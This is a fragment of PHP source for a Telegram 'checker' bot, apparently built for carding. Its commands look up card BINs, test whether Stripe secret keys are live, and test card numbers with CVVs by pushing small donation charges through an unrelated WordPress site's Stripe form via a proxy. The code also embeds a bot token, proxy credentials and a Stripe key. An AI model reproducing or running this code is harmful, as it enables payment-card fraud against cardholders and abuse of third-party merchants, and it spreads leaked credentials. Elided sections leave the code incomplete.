...
$botToken = "1888193646:AAGf7xRx8km3a307xTrPYjmrmQ_ND8ayI6U"; // Enter ur bot token
...
sendMessage($chatId, "<b>Hola!!%0AType /cmds para mirar los comandos!!%0A%0ABot Made by: JARB</b>");
}

//////////=========[Cmds Command]=========//////////

elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "<u>Bin lookup:</u> <code>!bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>!sk</code> sk_live%0A<u>Stripe:</u> <code>!chk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Info:</u> <code>/info</code> To know ur info%0A%0A<b>Bot Made by: JARB</b>");
}

//////////=========[Info Command]=========//////////

elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "<u>ID:</u> <code>$userId</code>%0A<u>First Name:</u> $firstname%0A<u>Username:</u> @$username%0A%0A<b>Bot Made by: JARB </b>");
}
...
curl_close($ch);
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.''.$emoji.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Currency:</b> '.$currency.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: JARB </b>');
}
curl_close($ch);
...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, "http://scraperapi:894e60b059976b6ee7793fe3c9fe2f62@proxy-server.scraperapi.com:8001");
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'time_on_page=19150&pasted_fields=number&guid=NA&muid=NA&sid=NA&key=pk_live_51HhBmTI8bXvpYaVL1e7SZgxDfOt9BdoxsPGpbgJ4eWnAtYYGwEeprzHmMZBy7cGPchQwQcREh4NnKpwFvrEWVzmf00SWbGmcdJ&payment_user_agent=stripe.js%2F7315d41&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://scraperapi:894e60b059976b6ee7793fe3c9fe2f62@proxy-server.scraperapi.com:8001");
curl_setopt($ch, CURLOPT_URL, 'https://vivomondo.net/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
...
'origin: https://vivomondo.net',
'referer: https://vivomondo.net/donar/',
'user-agent: '.$ua.'',
'x-Requested-With: XMLHttpRequest',
   ));
curl_setopt($ch, CURLOPT_POSTFIELDS,'action=wp_full_stripe_payment_charge&formName=Donar&fullstripe_custom_amount=0.50&fullstripe_name='.$name.'&stripeToken='.$id.'');
...
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot Made by: JARB </b>");
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot Made by: JARB </b>");
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot Made by: JARB </b>");
}else{
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot Made by: JARB </b>");
}}
